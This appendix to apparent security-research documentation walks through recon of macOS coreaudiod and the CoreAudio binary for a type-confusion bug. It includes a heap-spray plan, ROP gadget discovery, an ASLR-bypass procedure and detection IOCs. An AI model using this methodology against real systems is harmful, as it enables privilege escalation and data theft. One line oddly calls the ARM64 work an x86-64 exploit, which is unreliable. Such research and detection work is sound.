# Appendix A: Live Experiments - Deep Dive with Explanations

[<< Back to Main Documentation](./README.md) | [Next: Appendix B >>](./appendix-b.md)

---

```
+-------------------------------------------------------------------------+
| AUDIENCE: Beginner -> Expert (tiered exercises)                          |
| PREREQUISITES: macOS system, terminal access, optional sudo              |
| LEARNING OBJECTIVES:                                                    |
|   * Run real commands to explore coreaudiod                            |
|   * Understand launchd, entitlements, sandbox profiles                 |
|   * Extract and analyze CoreAudio from dyld cache                      |
|   * Find ROP gadgets                                                    |
|   * Analyze heap allocations                                           |
|   * Set up detection monitoring                                        |
+-------------------------------------------------------------------------+
```

---

These experiments were run on macOS 26.2 (Build 25C56) ARM64.
For each command, I explain:
  - **WHY** we use this command
  - **HOW** to interpret the output
  - **WHAT** this means for exploitation
  - **HOW** it connects to the bigger picture

---

## A.1  Perspective: System Configuration

### Experiment 1: Query coreaudiod's launchd configuration

**COMMAND:**
```bash
$ sudo launchctl print system/com.apple.audio.coreaudiod
```

**WHY THIS COMMAND?**

On macOS, launchd is the init system - the first process (PID 1) that starts everything else. Every system daemon has a launchd configuration that defines:
  - What executable to run
  - As what user/group
  - What Mach services to register
  - Resource limits and priorities

We use `launchctl print` because it shows the RUNTIME state, not just the plist file. This tells us what's actually happening right now.

The `system/` prefix means we're looking at a system-wide daemon, not a per-user service. `sudo` is needed because system daemons are privileged.

**OUTPUT (with line-by-line explanation):**
```
system/com.apple.audio.coreaudiod = {
  state = running
  ^^^^^^^^^^^^^^^^
  The daemon is currently active. If it said "waiting", it would
  mean it's registered but not yet started. Daemons can crash and
  restart - launchd manages this automatically.

  program = /usr/sbin/coreaudiod
  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  The actual binary. We can analyze this file with nm, otool, etc.
  It's in /usr/sbin which is SIP-protected - we can't modify it.

  username = _coreaudiod
  group = _coreaudiod
  ^^^^^^^^^^^^^^^^^^^^^^^
  CRITICAL: The daemon runs as a dedicated user "_coreaudiod" (UID
  202), NOT as root! This is defense in depth - even if exploited,
  we don't immediately have root privileges.

  BUT: _coreaudiod still has significant privileges via entitlements
  and isn't sandboxed like Safari, so it's still a valuable target.

  endpoints = {
    "com.apple.audio.audiohald" = {
      port = 0x18233
      active = 1
    }
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  THIS IS THE ATTACK SURFACE. "endpoints" lists the Mach services
  that coreaudiod registers with launchd. Any process can look up
  "com.apple.audio.audiohald" and get a send right to port 0x18233.

  "audiohald" = Hardware Abstraction Layer Daemon. This is the main
  service that apps use to access audio. Safari can connect here
  (allowed by its sandbox) and send Mach messages.

  The port number (0x18233) is a local port name in coreaudiod's
  IPC space. Other processes have different port names for the same
  underlying kernel port object.

  jetsam priority = 120
  jetsam memory limit (active, soft) = 160 MB
  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  Jetsam is macOS's OOM killer. Priority 120 is high - coreaudiod
  won't be killed unless system is extremely low on memory.
  The 160MB soft limit means warnings at 160MB, not hard kills.
}
```

**WHAT THIS MEANS FOR EXPLOITATION:**
1. We know the service name: `com.apple.audio.audiohald`
   - Our exploit uses `bootstrap_look_up()` with this name

2. We know it runs as `_coreaudiod`, not root
   - After exploitation, we have `_coreaudiod`'s privileges
   - Still useful: can write files, access network, escape sandbox

3. We know it has multiple endpoints
   - More attack surface to explore for future research

---

### Experiment 2: View coreaudiod's code signature and entitlements

**COMMAND:**
```bash
$ codesign -dvvv /usr/sbin/coreaudiod
$ codesign -d --entitlements - /usr/sbin/coreaudiod
```

**WHY THIS COMMAND?**

On macOS, code signing isn't just about identity - it's about CAPABILITY. Entitlements are key-value pairs embedded in the code signature that grant special privileges. The kernel and system services check these entitlements before allowing sensitive operations.

`codesign -d` displays signature information.
`--entitlements -` extracts the entitlements plist to stdout.
`-dvvv` gives very verbose output including hash type, team ID, etc.

**OUTPUT (with explanation):**

| Entitlement | What It Allows |
|-------------|----------------|
| `com.apple.private.audio.driver-host` | Load audio drivers |
| (Allows coreaudiod to host audio driver plugins. It can load code into its address space from HAL plugins.) | |
| `com.apple.rootless.storage.AudioSettings` | Write to SIP-protected `/Library/Preferences/Audio/` directory |
| (SIP (System Integrity Protection) exception! This entitlement lets coreaudiod write to locations that would otherwise be protected.) | |
| `com.apple.private.kernel.audio_latency` | Real-time thread priority |
| (Allows requesting real-time scheduling from the kernel for low-latency audio.) | |
| `com.apple.private.driverkit.driver-access` | DriverKit access |
| (Can communicate with DriverKit drivers. DriverKit is Apple's userspace driver framework (replacement for IOKit kexts).) | |
| `com.apple.private.tcc.manager.check-by-audit-token` | Query microphone permissions for other apps |
| (Can check TCC (Transparency, Consent, and Control) permissions for OTHER processes using their audit token.) | |
| `com.apple.security.iokit-user-client-class` | Direct hardware access via IOKit |
| (Can open IOKit user clients of specific classes. This is how coreaudiod talks to audio hardware drivers.) | |

**WHAT THIS MEANS FOR EXPLOITATION:**
1. `rootless.storage.AudioSettings` = We can write to protected paths!
   - After exploitation, we inherit this entitlement
   - We can persist malware in `/Library/Preferences/Audio/`

2. `driverkit.driver-access` = We can talk to drivers
   - Potential for kernel exploitation chaining

3. `tcc.manager` = We can check other apps' permissions
   - Information disclosure about user's privacy settings

---

### Experiment 3: Examine coreaudiod's sandbox profile

**COMMAND:**
```bash
$ cat /System/Library/Sandbox/Profiles/com.apple.audio.coreaudiod.sb
```

**WHY THIS COMMAND?**

Sandbox profiles are written in SBPL (Sandbox Profile Language), a Scheme-like DSL. They define what operations a process CAN and CANNOT do. The kernel enforces these rules at the syscall level.

We read the profile directly to understand coreaudiod's restrictions. Many assume "system daemons aren't sandboxed" - but that's often wrong!

**OUTPUT (with line-by-line analysis):**
```scheme
(version 1)
^^^^^^^^^^^
Sandbox profile format version. Version 1 is the standard format.

(deny default)
^^^^^^^^^^^^^^
CRITICAL: Start by denying everything, then whitelist specific
operations. This is the secure approach (vs. blacklisting).

(import "system.sb")
^^^^^^^^^^^^^^^^^^^^
Import base rules shared by all system processes. This includes
things like reading system libraries, accessing /dev/null, etc.

(allow file-read* (subpath "/Library/Preferences/Audio"))
(allow file-write* (subpath "/Library/Preferences/Audio"))
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Can read AND WRITE anything under /Library/Preferences/Audio/
This is where audio settings are stored. Normal for its job.
BUT: This is where our heap spray payload lands!

(allow network*)
^^^^^^^^^^^^^^^^^
FULL UNRESTRICTED NETWORK ACCESS!
This is HUGE. Most sandboxed apps have strict network rules.
coreaudiod needs this for:
  - AirPlay streaming
  - AVB (Audio Video Bridging) over Ethernet
  - Network audio devices

For attackers: After exploitation, we can:
  - Exfiltrate data to external servers
  - Download second-stage payloads
  - Establish C2 (command & control) channels
  - Pivot to other machines on the network

(allow mach-lookup
  (global-name "com.apple.audio.audiohald")
  (global-name "com.apple.tccd.system")
  (global-name "com.apple.PowerManagement.control"))
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Can connect to these Mach services. Limited set - coreaudiod
can't just talk to any service. But it can talk to TCC!
```

**THE SURPRISING DISCOVERY:**

Before running this command, I assumed coreaudiod was unsandboxed. Many security researchers make this assumption about system daemons.

The reality: It IS sandboxed, but the sandbox is PERMISSIVE:
- `(allow network*)` = Full network access
- `(allow file-write* /Library/Preferences)` = Broad file writes
- Can't write to `~/Library`, `/Applications`, `/Users`, etc.
- Can't spawn arbitrary processes

**WHAT THIS MEANS FOR EXPLOITATION:**

After exploiting coreaudiod, we STILL have significant capabilities:
1. **NETWORK:** Download payloads, exfiltrate data, C2 communication
2. **FILE WRITE:** Persist in `/Library/Preferences/Audio/`
3. **MACH IPC:** Talk to TCC to enumerate privacy permissions

We DON'T have:
- Root privileges (we're `_coreaudiod` user)
- Ability to read user documents directly
- Ability to spawn arbitrary child processes

This is why sandbox escapes are valuable even when the sandbox is "weak" - `(allow network*)` alone makes coreaudiod a high-value target!

---

## A.2  Perspective: Reverse Engineering

### Experiment 4: Extract CoreAudio from dyld shared cache

**COMMAND:**
```bash
$ brew install blacktop/tap/ipsw
$ ipsw dyld extract \
    /System/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e \
    "/System/Library/Frameworks/CoreAudio.framework/Versions/A/CoreAudio" \
    -o /tmp/extracted
```

**WHY THIS COMMAND?**

On modern macOS (11+), you can't just "open CoreAudio.framework" and look at the binary. Apple combined ALL system libraries into a single giant file called the "dyld shared cache" (~2GB).

**WHY did Apple do this?**
1. **PERFORMANCE:** All libraries are pre-linked together. No runtime relocation needed. Apps start faster.
2. **MEMORY:** All processes share the same physical pages for system libraries. Less RAM usage.
3. **SECURITY(?):** Makes it slightly harder to analyze individual libraries. But tools like ipsw exist, so it's not real security.

The cache is at:
```
/System/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
```

"Cryptexes" is Apple's new signed filesystem for system code.
"arm64e" means ARM64 with Pointer Authentication (Apple Silicon).

"ipsw" is a tool by @blacktop that can extract individual libraries from the cache so we can analyze them.

**OUTPUT:**
```
[*] Created /tmp/extracted/CoreAudio
```

Now we have a standalone Mach-O binary we can analyze with nm, otool, radare2, Ghidra, IDA Pro, etc.

---

### Experiment 5: Find HALS_Object-related symbols

**COMMAND:**
```bash
$ nm /tmp/extracted/CoreAudio | grep -i HALS | head -30
```

**WHY THIS COMMAND?**

`nm` lists symbols (function names, global variables) from a binary. Unlike stripped binaries, Apple's system libraries still have symbols for debugging. This is goldmine for reverse engineers!

We grep for "HALS" because the vulnerability is in the HALS (Hardware Abstraction Layer Server) subsystem. HALS is the server-side code that runs in coreaudiod and handles IPC from client applications.

**OUTPUT (with detailed explanation):**
```
ADDRESS          TYPE SYMBOL
--------------------------------------------------
00000001eed3be80 s    _HALS_HALB_MIGServer_subsystem
^^^^^^^^^^^^^^^^ ^    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Virtual address  |    Symbol name
                 |
                 +-- "s" = static data symbol
                     "t" = text (code) symbol
                     "T" = global text symbol

0000000183749bf0 t _HALS_IOContext_StartAtTime
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^
                   Functions starting with HALS_IOContext_ operate
                   on IOContext objects (type 'ioct').

000000018374a288 t _HALS_Object_GetPropertyData
000000018374f7e4 t _HALS_Object_SetPropertyData
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                   These work on ANY HALS_Object. They're on the
                   base class. The "SetPropertyData" function is
                   what we use for HEAP SPRAY (via plists).

0000000183746ad0 t _HALS_System_CreateIOContext
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                   Creates an IOContext object. Returns an object_id.

00000001837486d8 t _HALS_TransportManager_CreateDevice
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                   Creates a TransportManager object (type 'trpm').
```

**WHAT WE LEARN FROM THE SYMBOLS:**
1. **CLASS HIERARCHY:** We see HALS_Object, HALS_IOContext, HALS_System, HALS_TransportManager. These are different object types!

2. **NAMING CONVENTION:** Functions are named ClassName_MethodName. This helps us understand what operates on what.

3. **THE BUG:** The type confusion happens because `CopyObjectByObjectID()` returns a generic `HALS_Object*`, but callers like `_XIOContext_Fetch_Workgroup_Port` assume it's a `HALS_IOContext*`.

**THE HALS CLASS HIERARCHY (inferred from symbols):**

```
HALS_Object (base)
+-- HALS_System (type 'syst') - System-wide audio management
+-- HALS_IOContext (type 'ioct') - I/O context for audio streams
+-- HALS_Engine (type 'ngne') - Audio processing engine
+-- HALS_Stream (type 'strm') - Audio stream
+-- HALS_Device (type 'adev') - Audio device
+-- HALS_TransportManager (type 'trpm') - Transport management
```

---

### Experiment 6: Find MIG message handlers (attack surface enumeration)

**COMMAND:**
```bash
$ nm /tmp/extracted/CoreAudio | grep "__X" | head -20
```

**WHY THIS COMMAND?**

MIG (Mach Interface Generator) is Apple's RPC compiler. When you define a Mach service interface in a .defs file, MIG generates:
  - Client stubs (for sending messages)
  - Server handlers (for receiving messages)

Server handlers follow a naming convention: `__X<FunctionName>`
The double underscore + X prefix is MIG's signature.

Finding these symbols tells us EXACTLY what messages we can send to coreaudiod. Each `__X` function is a potential attack vector!

**OUTPUT (with detailed analysis):**
```
0000000183c11ce0 t __XIOContext_Fetch_Workgroup_Port
^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Address in memory  Function name

THIS IS THE VULNERABLE HANDLER!
It's supposed to operate on an IOContext ('ioct') object.
But it doesn't check if the object_id actually refers to an IOContext!
If we pass an Engine ('ngne') object_id, it treats the Engine
as if it were an IOContext -> TYPE CONFUSION!

0000000183c0d000 t __XIOContext_PauseIO
0000000183c0cbf0 t __XIOContext_ResumeIO
0000000183c1b8cc t __XIOContext_SetClientControlPort
0000000183c1b7ac t __XIOContext_Start
                   ^^^^^^^^^^^^^^^^^^
All __XIOContext_* functions expect IOContext objects.
Any of these could be vulnerable to the same type confusion!
(The bug affects 6 handlers total - variant analysis!)

0000000183c16070 t __XObject_SetPropertyData
                   ^^^^^^^^^^^^^^^^^^^^^^^^^
This is the HEAP SPRAY handler! It takes a plist as input
and deserializes it, allocating memory for the contents.
We use this to fill the heap with our controlled data.

0000000183c14968 t __XObject_AddPropertyListener
0000000183c1aec0 t __XObject_HasProperty
0000000183c1a9a8 t __XObject_IsPropertySettable
                   ^^^^^^^^^^^^^^^^
__XObject_* functions work on the base HALS_Object class.
These are SAFER because they don't assume a specific subtype.
```

**ATTACK SURFACE MATH:**
```bash
$ nm /tmp/extracted/CoreAudio | grep "__X" | wc -l
79  # 79 MIG handlers = 79 potential attack vectors!

$ nm /tmp/extracted/CoreAudio | grep "__XIOContext" | wc -l
17  # 17 handlers expect IOContext
```

Of those 17, how many validate the object type? Our research found: 0!
That's why 6 of them were vulnerable to type confusion.

---

### Experiment 7: Find ROP gadgets

**COMMAND:**
```bash
$ pip3 install ROPGadget
$ ROPgadget --binary /tmp/extracted/CoreAudio | wc -l
$ ROPgadget --binary /tmp/extracted/CoreAudio | head -30
```

**WHY THIS COMMAND?**

ROPgadget is the standard tool for finding Return-Oriented Programming gadgets. It scans a binary for useful instruction sequences that end in a "return" instruction.

**WHY do we need gadgets?**
1. Modern systems have W^X (Write XOR Execute) protection
2. We can't inject and execute shellcode
3. Instead, we chain EXISTING code snippets (gadgets)
4. Each gadget does one small thing, then "returns" to next gadget

**OUTPUT:**
```
26923 gadgets found  # Over 26,000 gadgets in CoreAudio alone!
```

**UNDERSTANDING ARM64 GADGET OUTPUT:**
```
0x1837c7bc8 : add sp, sp, #0x20 ; ret
^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^^
Address       Instruction sequence

This gadget:
  1. add sp, sp, #0x20 -> Add 0x20 (32) to stack pointer
  2. ret -> Pop return address from stack, jump there

Use case: Stack adjustment, frame skipping

0x183799a34 : add sp, sp, #0x30 ; autibsp ; ret
                                  ^^^^^^^
"autibsp" = Authenticate Instruction-B with Stack Pointer
This is POINTER AUTHENTICATION (PAC)!

On ARM64e (Apple Silicon), return addresses are SIGNED:
  - When a function is called, the return address is signed
  - Before returning, autibsp verifies the signature
  - If signature is invalid -> crash (not exploitation)

0x1837d26f4 : add sp, sp, #0x110 ; retab
                                   ^^^^^
"retab" = Return with Authentication-B
This is an authenticated return - harder to exploit!

FOR EXPLOITATION:
  - Gadgets ending in plain "ret" (no auth) are easiest
  - Gadgets with "autibsp ; ret" need valid PAC signatures
  - ARM64e exploitation requires PAC bypass or signing gadgets
```

**WHAT WE LEARN:**
1. 26,923 gadgets = Rich gadget library for building ROP chains
2. Many gadgets have PAC (autibsp, retab) = ARM64e is harder to exploit
3. Some gadgets end in plain "ret" = Potentially usable without PAC bypass
4. This is x86-64 exploit; ARM64e would need different approach

---

## A.3  Perspective: Detection & Forensics

### Experiment 8: Monitor coreaudiod logs in real-time

**COMMAND:**
```bash
$ log show --predicate 'process == "coreaudiod"' --last 5m
```

**WHY THIS COMMAND?**

macOS uses the "unified logging" system (introduced in macOS 10.12). All system logs go through this centralized system. The `log` command lets us query it.

`--predicate 'process == "coreaudiod"'` filters for only coreaudiod logs.
`--last 5m` shows the last 5 minutes.

As a DEFENDER (Clement's perspective), we want to:
1. Understand what NORMAL looks like
2. Detect ANOMALIES that indicate exploitation

**OUTPUT (BASELINE - what normal looks like):**
```
2026-01-31 04:34:20 coreaudiod: (BTAudioHALPlugin)
  [BTAudio] BTHAL got kBTAudioMsgPropertyForegroundApp: <private>
  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  Bluetooth audio plugin checking which app is in foreground.
  This is NORMAL - happens constantly when Bluetooth audio is used.

2026-01-31 04:34:27 coreaudiod: (libAudioIssueDetector.dylib)
  [aid] RTAID [ use_case=Generic report_type=RMS ]
  -- [ rms:[-51.4], peaks:[-37.2] ]
  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  Audio quality monitoring. RMS (loudness) and peak levels.
  NORMAL - coreaudiod monitors audio quality continuously.

WHAT'S NOTABLY ABSENT:
  - No file operation logs (open, write, create)
  - No network connection logs
  - No process spawn logs
  - No errors or crashes
```

**DETECTION STRATEGY:**

Look for things that SHOULDN'T be there:

**AFTER EXPLOITATION, you might see:**

| ANOMALY | What it means |
|---------|---------------|
| Network connection from coreaudiod to external IP | Exploitation! coreaudiod normally doesn't initiate outbound connections (except AirPlay, which has patterns) |
| File created in /tmp or other unexpected locations | Post-exploitation staging. Attacker may drop payloads or tools. |
| Child process spawned by coreaudiod (fork/exec) | Definitely exploitation! coreaudiod never spawns children normally. |
| Crash in `_XIOContext_*` function | Failed exploitation attempt. Type confusion crash signature. |

**REAL-TIME MONITORING COMMAND:**
```bash
$ log stream --predicate 'process == "coreaudiod"' --level debug
```

This shows logs AS THEY HAPPEN. Good for watching an active attack.

---

### Experiment: Check Audio preferences directory

**PURPOSE:** Understand normal state vs. exploit artifacts

```bash
$ ls -la /Library/Preferences/Audio/
```

**OUTPUT:**
```
total 16
drwxrwxr-x  5 root         _coreaudiod   160 Jan 27 22:34 .
drwxr-xr-x 50 root         wheel        1600 Jan 31 04:26 ..
-rw-r--r--  1 _coreaudiod  _coreaudiod  2068 Jan 28 11:07
  com.apple.audio.DeviceSettings.plist
-rw-rw-r--  1 _coreaudiod  _coreaudiod  2423 Jan 31 04:14
  com.apple.audio.SystemSettings.plist
drwxrwxrwx  2 _coreaudiod  _coreaudiod    64 Nov 22 03:49 Data
```

**DETECTION IOCs:**
- `DeviceSettings.plist` > 5MB (normal: ~2KB) = HEAP SPRAY DETECTED
- Any unexpected files (e.g., `malicious.txt`) = EXPLOIT ARTIFACT
- Files with `_coreaudiod` ownership outside this directory = SUSPICIOUS

---

### Experiment: Monitor file system activity on Audio directory

**PURPOSE:** Detect heap spray in progress

```bash
$ sudo fs_usage -w -f filesys | grep -i audio
```

**DETECTION:** During heap spray, you'll see:
- Large writes to DeviceSettings.plist
- Multiple open/close cycles
- File growing to megabytes in seconds

---

## A.4  Perspective: Heap Analysis

This section approach: understand the memory allocator at a DEEP level. You can't reliably exploit heap bugs without knowing how the heap actually works.

### Experiment 9: Analyze coreaudiod heap allocations

**COMMAND:**
```bash
$ sudo heap $(pgrep coreaudiod)
```

**WHY THIS COMMAND?**

The `heap` command is macOS's built-in heap analysis tool. It reads a process's memory and categorizes all malloc allocations by:
  - Size class (how big each allocation is)
  - Object type (Objective-C class or "non-object")
  - Count (how many of each)

**WHY do we need `sudo`?**
coreaudiod runs as user `_coreaudiod`, not us. Reading another process's memory requires root privileges. `$(pgrep coreaudiod)` gets its PID.

**WHY is this important for exploitation?**
1. **HEAP SPRAY TARGETING:** We need allocations the SAME SIZE as the vulnerable object (Engine = 1152 bytes). If we spray different sizes, our data won't land where the Engine is allocated.

2. **HOLE CREATION:** malloc reuses freed memory. We need to understand what's already in the heap to create "holes" of the right size.

3. **RELIABILITY:** Blind spraying is unreliable. Understanding the heap lets us PREDICT where our data lands.

**OUTPUT (with detailed line-by-line analysis):**
```
Process:         coreaudiod [188]
Physical footprint:         21.6M
Physical footprint (peak):  42.4M
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
"Physical footprint" = actual RAM used (not virtual address space).
21.6MB is relatively small. Peak of 42.4MB suggests some large
temporary allocations happened and were freed.

Process 188: 4 zones
^^^^^^^^^^^^^^^^^^^^^^^^
macOS malloc uses "zones" to organize allocations. Each zone manages
different size classes:
  - MALLOC_TINY: 16 to 1008 bytes (16-byte quantum)
  - MALLOC_SMALL: 1009 to 127KB (512-byte quantum)
  - MALLOC_MEDIUM: 127KB to 1MB
  - MALLOC_LARGE: > 1MB (mmap'd directly)

Engine objects (1152 bytes) go to MALLOC_SMALL!

All zones: 73602 nodes malloced
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
73,602 individual allocations. This is a LOT!
Complex heap state = harder to predict, but we can still succeed
with enough spray volume.

  Sizes: 3280KB[1] 848KB[1] 752KB[2] 336KB[4] 192KB[5]
         1KB[238] 896[141] 768[371] 640[253] 512[310]
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FORMAT: size[count]

Reading: "1KB[238]" means 238 allocations of 1024 bytes (1KB)
         "896[141]" means 141 allocations of 896 bytes

CRITICAL OBSERVATION:
No "1152[X]" entry! This means Engine objects (1152 bytes) are RARE.
When we create an Engine, malloc will pull from MALLOC_SMALL.
If we pre-fill MALLOC_SMALL with our controlled data, the Engine
inherits our data when allocated!

         384[456] 320[365] 256[401] 224[1149] 192[4241]
         160[847] 128[1946] 112[2429] 96[5386] 80[8510]
         64[4986] 48[12337] 32[15432] 16[12062]
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Small allocations dominate. 32 bytes has 15,432 allocations!
These are Objective-C objects, strings, small buffers, etc.

Top allocations:
  COUNT      BYTES       AVG   CLASS_NAME
  44220   22030288     498.2   non-object
  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
"non-object" = raw C allocations (not Objective-C).
44,220 allocations averaging 498 bytes each.
These are the bulk of heap usage.

   5487     301760      55.0   CFString
   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
CFString = Core Foundation strings.
IMPORTANT: plist deserialization creates CFStrings!
When we spray via SetPropertyData with plist strings,
malloc creates CFStrings for each string value.

   2045      98160      48.0   NSMutableArray
   1208      38656      32.0   NSMutableDictionary
   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
plist arrays and dictionaries. Each nested array in our spray
creates one of these.

    774      99072     128.0   dispatch_queue_t (serial)
    688      55040      80.0   dispatch_semaphore_t
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
GCD (Grand Central Dispatch) objects. coreaudiod uses lots of
async operations for audio processing.
```

**THE KEY INSIGHT FOR EXPLOITATION:**

We want to spray 1152-byte chunks. Engine objects are 1152 bytes.

1. We send plist with strings of ~1100 bytes
2. CFString allocates ~1152 bytes (string + header + alignment)
3. These go to MALLOC_SMALL zone
4. We free some to create "holes"
5. When Engine is created, it gets a "hole" with our data
6. Engine's offset 0x68 inherits our controlled pointer

**ANALOGY - "The Parking Lot":**

Think of MALLOC_SMALL as a parking lot with spots for 1152-byte cars.
- We fill many spots with OUR cars (spray)
- We remove some of our cars (free) to create empty spots
- When a new car (Engine) arrives, it parks in one of OUR old spots
- That spot still has our stuff on the ground (controlled data)

**HEAP SPRAY CALCULATION:**
```
Target: 1152-byte allocations
String content size: ~1100 bytes (leaves room for CFString header)
Strings per spray iteration: 50
Iterations: 100
Total spray allocations: 5000
Total spray size: ~5.75 MB

If 10% of slots are "holes" = 500 controlled holes
If we create 10 Engine objects, ~1 should land in our spray
That's why we try multiple times!
```

---

### Experiment 10: View coreaudiod memory map

**COMMAND:**
```bash
$ sudo vmmap $(pgrep coreaudiod) | grep -E "dyld|CoreAudio|malloc"
```

**WHY THIS COMMAND?**

`vmmap` shows the VIRTUAL MEMORY MAP of a process - every memory region, what it's for, and what permissions it has. This is essential for:

1. **ASLR UNDERSTANDING:** Where did libraries load?
2. **ROP GADGET ADDRESSES:** Gadgets need correct base addresses
3. **HEAP LOCATION:** Where does malloc put our spray?
4. **PROTECTION BITS:** What memory is executable vs. writable?

We grep for "dyld", "CoreAudio", and "malloc" because:
- "dyld shared cache" = where ALL system libraries live (including gadgets)
- "CoreAudio" = the vulnerable library we're analyzing
- "malloc" = heap regions where our spray lands and Engine is allocated

**OUTPUT (with detailed analysis):**
```
Region                  Start-End               Size   Prot
------------------------------------------------------------------------
__TEXT CoreAudio        18e219000-18e9c5000    7856K   r-x
^^^^^^ ^^^^^^^^^        ^^^^^^^^^^^^^^^^^       ^^^^   ^^^
  |       |                    |                  |     |
  |       |                    |                  |     +- r-x = Read,
  |       |                    |                  |        no Write,
  |       |                    |                  |        eXecute
  |       |                    |                  |
  |       |                    |                  +- 7.8 MB of code
  |       |                    |
  |       |                    +- Virtual address range
  |       |                       (0x18e219000 to 0x18e9c5000)
  |       |
  |       +- "CoreAudio" = the framework we extracted and analyzed
  |
  +- "__TEXT" = executable code section

WHY THIS MATTERS:
ROP gadgets are in __TEXT sections (executable code).
Address 0x18e219000 is the SLIDE-ADJUSTED base.
To calculate a gadget's runtime address:
  runtime_addr = file_offset + slide_base

dyld shared cache       20a53c000-22f2b8000    589.5M  r--
^^^^^^^^^^^^^^^^^^      ^^^^^^^^^^^^^^^^^       ^^^^^^   ^^^

This is the BIG ONE. On modern macOS, Apple combined ALL system
libraries into a single 589MB region. This is the "dyld shared cache".

CRITICAL SECURITY INSIGHT:
The dyld shared cache is loaded at the SAME address in ALL processes
on a given boot. Apple uses "shared cache ASLR" but the slide is
SYSTEM-WIDE, not per-process.

WHY? Performance. The kernel maps the same physical pages into all
processes. If each process had a different slide, they couldn't share
physical memory, wasting gigabytes of RAM.

EXPLOITATION CONSEQUENCE:
If we know the slide in OUR process (attacker-controlled Safari),
we know the slide in coreaudiod! Just read a pointer from a known
location in our own process, calculate the slide, and use that
for ROP gadget addresses in coreaudiod.

MALLOC_TINY             104d94000-105194000    4096K   rw-
^^^^^^^^^^^             ^^^^^^^^^^^^^^^^^       ^^^^   ^^^

MALLOC_TINY = heap zone for small allocations (16-1008 bytes).
"rw-" = readable + writable, NOT executable.

This is where many of our spray allocations land (for small strings).
The 4MB size means there's room for many allocations.

MALLOC metadata         104a9c000-104ae4000    288K    rw-
^^^^^^^^^^^^^^^
malloc keeps bookkeeping structures (free lists, zone info) here.
Corrupting this = potential code execution (but harder).
```

**UNDERSTANDING ASLR ON macOS:**

macOS has MULTIPLE ASLR mechanisms:

1. **DYLD SHARED CACHE SLIDE (system-wide):**
   - Random at boot time
   - SAME for all processes until reboot
   - ~256 possible positions (low entropy!)
   - Can leak from own process -> know target's addresses

2. **PIE (Position Independent Executable):**
   - Each process's main binary loads at random address
   - Independent per-process
   - But coreaudiod's code is IN the shared cache, so #1 applies

3. **STACK ASLR:**
   - Stack starts at random address per process
   - Independent per-process
   - Matters for stack pivots

4. **HEAP ASLR:**
   - malloc zones at random addresses
   - Independent per-process
   - For heap spray, we don't need exact address - just fill the zone!

**PRACTICAL ASLR BYPASS:**
```
STEP 1: In attacker's Safari (sandboxed), read a pointer from
        the dyld shared cache (any global variable works).

STEP 2: Subtract the "expected" offset (from our binary analysis)
        to get the cache slide.

STEP 3: Add slide to our ROP gadget offsets -> correct runtime addresses.

STEP 4: These addresses work in coreaudiod too! (Same slide)
```

**VMMAP REGIONS WE DIDN'T GREP:**

Full vmmap output has ~200 regions including:
- `__DATA` segments (writable globals)
- `__OBJC` segments (Objective-C metadata)
- Stack regions
- Memory-mapped files
- Kernel-shared regions
- Guard pages (unmapped, to catch buffer overflows)

---

## A.5 Combined Workflow: Putting It All Together

Now we connect all the experiments into a coherent methodology. Each step builds on the previous one. This is the SYSTEMATIC APPROACH to vulnerability research that separates methodical researchers from random bug hunters.

### Complete Analysis Workflow (With Rationale)

#### PHASE 1: RECONNAISSANCE - UNDERSTAND THE TARGET

**GOAL:** Before touching binaries, understand what we're attacking.

```bash
$ sudo launchctl print system/com.apple.audio.coreaudiod
# Q: Is it running? As what user? What services does it expose?
# A: Running as _coreaudiod, exposes com.apple.audio.audiohald

$ codesign -d --entitlements - /usr/sbin/coreaudiod
# Q: What special privileges does it have?
# A: Can write to SIP-protected Audio directory, access DriverKit

$ cat /System/Library/Sandbox/Profiles/com.apple.audio.coreaudiod.sb
# Q: Is it sandboxed? What CAN'T it do?
# A: Sandboxed but (allow network*) = full network access!
```

**WHY THIS ORDER?**
Understanding privileges BEFORE exploitation tells us what we'll gain if we succeed. No point exploiting a fully sandboxed daemon that can't do anything useful. coreaudiod CAN do useful things!

---

#### PHASE 2: BINARY EXTRACTION - GET THE CODE

**GOAL:** Extract analyzable binaries from dyld shared cache.

```bash
$ brew install blacktop/tap/ipsw
# Q: How do I get ipsw?
# A: It's a Go tool, Homebrew has a tap from the author

$ ipsw dyld extract <cache_path> CoreAudio -o /tmp/extracted
# Q: How do I get CoreAudio.framework out of the cache?
# A: ipsw extracts individual libraries from the monolithic cache

$ nm /tmp/extracted/CoreAudio | grep HALS
# Q: What classes/functions exist in the audio server?
# A: HALS_Object hierarchy: IOContext, Engine, Stream, etc.

$ nm /tmp/extracted/CoreAudio | grep __X
# Q: What MIG handlers can I send messages to?
# A: 79 handlers! __XIOContext_Fetch_Workgroup_Port is vulnerable
```

**WHY nm AND NOT DISASSEMBLER?**
